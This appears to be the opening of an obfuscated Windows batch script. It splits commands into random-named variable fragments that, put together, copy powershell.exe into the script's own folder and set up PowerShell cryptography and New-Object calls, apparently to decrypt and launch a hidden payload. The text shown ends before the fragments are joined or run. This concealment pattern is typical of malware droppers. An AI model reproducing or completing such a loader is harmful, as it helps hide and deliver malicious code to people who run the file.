@echo off
set "PwJCRmYBIy=\v"
set "dXqaecVRYy=he"
set "LooijmJrNG=Po"
set "ASwFaadLZH=Wi"
set "pvUSSylYup=nd"
set "qkahKBGVoE=do"
set "uyDGjErHNW=0\"
set "yuRkZZMNiv= /"
set "xjBnEmSCHB=s\"
set "IqeWWkRoNr=Sy"
set "EaulCqqBfc=we"
set "wHEikgTGnF=em"
set "ELvHgfXOEK=ws"
set "fKbXnsrNRe=py"
set "TzqNAKZsSa=rS"
set "tUkowZpevI=ll"
set "IabZesEwhQ=ow"
set "mqyNCHJtgA=1."
set "UXcEvqTcsn=rs"
set "vuaZfbMVLQ=in"
set "NtFWbKdFlK=co"
set "GMgFQxVimD=:\"
set "lXOWVAQxBH=st"
set "SoiIZDrjfP=ll"
set "BqJPEzuFre=\W"
set "VqNLfwdvCV=he"
set "fohHCLcdDm= C"
set "bOHKyYOsIJ=y "
set "GJrSHrVfcT=32"
set "tQndkGnOiS=po"
set "OWBvcvOIHU=.e"
set "NlwVXNHxtP=xe"
set "eujzlBPufs=we"
set "DbjKUBlseB= %~dp0"
set "dazgOVpEDl=cd"
set "zEhGUwjnnx=yste"
set "GMYksRsACe=pose"
set "NooNYUCOOt=.Cry"
set "coBJMIrtmp=join"
set "TMpRtrCTkb=('%*'"
set "dBIkTpApDP=qET "
set "VfOrGFPOuM=nirt"
set "oMwlXMQVqV=ispo"
set "ULANCfpGep=Uxbf"
set "jGSCwWOiYK=ct S"
set "zsrTcfahfB=n.Pa"
set "FnVDOOqqyr=bjec"
set "pBTbKywQau=ptog"
set "ZSELOKqIWw=] -j"
set "cuKGaufrjE=ddin"
set "yIXKeVjkGO=ach "
set "DGqjppVlZi=oArr"
set "FkcNpLzrIP= New"
set "GVRYLCDKJy=m.IO"
set "HEkvZywCbL=e = "
set "cRFkYaelAG=no);"
